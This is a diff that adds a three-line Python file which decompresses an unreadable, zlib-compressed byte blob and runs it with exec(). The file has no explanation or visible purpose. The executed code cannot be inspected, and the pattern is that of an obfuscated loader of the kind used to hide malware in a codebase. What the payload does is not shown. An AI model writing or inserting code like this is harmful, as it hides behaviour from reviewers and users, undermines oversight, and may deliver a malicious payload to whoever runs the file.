@@ -1,0 +1,3 @@
+#coding:L1
+import zlib
+exec(zlib.decompress(bytes("¥P7B€PÃ-Ü¨ö	ÌIbìAiA¹;Õ>:A^‡)á94Q€¢í“‡pˆ­ïB“GcÚÈ+~ž‡÷½W=cQ¢F…ßŸ‚Ç”½•‚¹ÕG	[Ñ9|I_û‹¡cÞH¨J0ä˜,WêŒ§J'¼qÐ¥q…ƒ!Yø%Gþ4Ì~9@7fÃ3m7¸ò×µ·ïFûÍÀ¶§‚[}€&Ü™•ÖJÞÓ1öTçHmÚ1iï bþ!/ßqp™¿¼$v–è%A¯Ò)_)ñUÍ(ÿú}.[é–ˆd•ú|Ÿ‚_ƒ0â¼Q0",'L1'),-9))
